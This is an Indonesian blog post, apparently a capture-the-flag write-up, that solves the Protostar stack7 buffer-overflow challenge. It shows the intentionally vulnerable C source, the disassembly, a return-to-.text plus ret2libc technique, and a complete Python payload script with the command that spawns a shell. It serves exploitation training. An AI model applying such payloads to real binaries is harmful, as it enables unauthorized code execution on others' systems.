---
layout: post
title: "Protostar: stack7"
date: 2020-09-09 20:05:03 +0700
categories: [reversing, protostar]
---

Sekarang kita telah sampai pada challenge terakhir protostar bertajuk stack, stack7. Seperti biasa kita akan coba periksa stack7 dengan utilitas `file`.

```bash
file stack7
```

output:
![output file stack7](/images/protostar-stack7-1.png)

Sepertinya tidak ada yang perlu diperhatikan, sekarang mari kita lihat source codenya.

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

char *getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xb0000000) == 0xb0000000) {
      printf("bzzzt (%p)\n", ret);
      _exit(1);
  }

  printf("got path %s\n", buffer);
  return strdup(buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```

Dibandingkan dengan [stack6](/belajar-reversing-protostar-stack6) kemarin perbedaan terletak pada pengecekan. Kali ini pengecekan return address lebih ketat, kita tidak boleh return ke address 0xbxxxxxxx. Jadi sudah pasti kita tidak bisa return ke stack dan jika kalian perhatikan kembali pada [stack6](/belajar-reversing-protostar-stack6) kemarin address fungsi system memenuhi kondisi 0xbxxxxxxx yang berarti kita tidak bisa melakukan ret2libc!
Menengok ke [halaman resmi stack7](http://exploit.education/protostar/stack-seven/), untuk menyelesaikan challenge ini kita bisa menggunakan [**return to .text**](https://halcyonic.net/2019-09-30-return-to-text/). Jika dalam ret2libc kita mereturn ke libc yang diload, ret2.text berarti kita mereturn ke segment .text. Dalam komputasi, segmen kode, juga dikenal sebagai segmen teks atau hanya sebagai teks, adalah bagian dari file objek atau bagian yang sesuai dari ruang alamat virtual program yang berisi instruksi yang dapat dieksekusi -[wikipedia](https://en.wikipedia.org/wiki/Code_segment).

Segment .text dari stack7 dapat kita lihat dengan bantuan `objdump`.

```bash
objdump -d .j .text stack7
```

output:
![output command diatas](/images/protostar-stack7-2.png)

Dapat kalian lihat pada gambar diatas, segment .text berisikan entry point dan jika kalian scroll kebawah kalian dapat melihat hasil disassembly fungsi **main** dan **getpath**. Jika kalian ingin melihat daftar segment yang terdapat dalam executable stack7 kalian dapat memenfaatkan opsi **-h** dari objdump `objdump -h stack7` atau bisa juga dengan menggunakan gdb, gunakan `info file` jika kalian sudah meload executable stack7 pada gdb.

Sekarang bagaimana kita akan memanfaatkan segment .text untuk mendapatkan akses shell? Dengan adanya pengecekan kita tidak bisa mereturn ke stack atau libc. Namun jika kalian cermati address dari segment .text berkisar antara **0x08048410 - 0x080485fc** sehingga kita bisa mereturn ke instruksi yang ada disini. Pengecekan hanya terdapat pada fungsi getpath, jadi setelah keluar dari getpath kita bisa mereturn ke address manapun. Perhatikan ilustrasi payload dari [stack6](/belajar-reversing-protostar-stack6) berikut.

![ilustrasi payload stack6](/images/protostar-stack6-10.png)

Pada stack6 kita berhasil memanggil fungsi system lalu keluar executable dengan fungsi exit. Pada stack7 ini kita bisa memanggil fungsi perantara lalu keluar menuju fungsi system. Cukup menggeser payload kita 4 byte lalu menyisipkan address fungsi perantara sebelum address system. Berikut ilustrasi payload yang akan kita gunakan pada stack7.
![ilustrasi payload stack7](/images/protostar-stack7-3.png)

Sekarang kita akan mencari perantara.

```bash
objdump -d -j .text stack7
objdump -d -j .text -M intel stack7 #jika lebih suka hasil disassembly dalam format intel
```

output:
![output perintah diatas](/images/protostar-stack7-4.png)

Beruntung sekali fungsi terakhir yang ditampilkan sepertinya dapat kita gunakan.

```nasm
080485d0 <__do_global_ctors_aux>:
 80485d0:	55                   	push   ebp
 80485d1:	89 e5                	mov    ebp,esp
 80485d3:	53                   	push   ebx
 80485d4:	83 ec 04             	sub    esp,0x4
 80485d7:	a1 54 96 04 08       	mov    eax,ds:0x8049654
 80485dc:	83 f8 ff             	cmp    eax,0xffffffff
 80485df:	74 13                	je     80485f4 <__do_global_ctors_aux+0x24>
 80485e1:	bb 54 96 04 08       	mov    ebx,0x8049654
 80485e6:	66 90                	xchg   ax,ax
 80485e8:	83 eb 04             	sub    ebx,0x4
 80485eb:	ff d0                	call   eax
 80485ed:	8b 03                	mov    eax,DWORD PTR [ebx]
 80485ef:	83 f8 ff             	cmp    eax,0xffffffff
 80485f2:	75 f4                	jne    80485e8 <__do_global_ctors_aux+0x18>
 80485f4:	83 c4 04             	add    esp,0x4
 80485f7:	5b                   	pop    ebx
 80485f8:	5d                   	pop    ebp
 80485f9:	c3                   	ret
 80485fa:	90                   	nop
 80485fb:	90                   	nop
```

Kita tidak perlu mereturn ke keseluruhan fungsi diatas, cukup pada bagian instruksi **ret** saja sehingga tidak mengacaukan stack yang telah kita manipulasi. Salin address instruksi ret, sisipkan pada payload yang kita gunakan pada [stack6](/belajar-reversing-protostar-stack7.png). Kita tidak perlu mencari offset karena ukuran buffernya sama dengan stack6, begitu juga dengan address system, address exit, string '/bin/sh' pada libc.

```python
import struct

offset=80*"A" #padding
perantara=struct.pack("<I", 0x80485f9) #(eip) return ke instruksi ret
system=struct.pack("<I", 0xb7ecffb0) #return ke system setelah instruksi ret selesai
exit=struct.pack("<I", 0xb7ec60c0) #keluar dari executable
args=struct.pack("<I", 0xb7e97000 + 0x11f3bf) #argumen untuk system
print(offset+perantara+system+exit+args)
```

Diatas merupakan script python yang akan menghasilkan payload untuk kita. Simpan dengan nama payload.py pada directory /tmp. Lalu kita jalankan stack7 dengan input payload kita.

```bash
(python /tmp/payload.py; cat) | ./stack7
```

output:
![menjalankan stack7 dengan payload](/images/protostar-stack7-5.png)

Berhasil! Selain menggunakan fungsi system, disini kita juga bisa menggunakan shellcode, selamat mencoba.
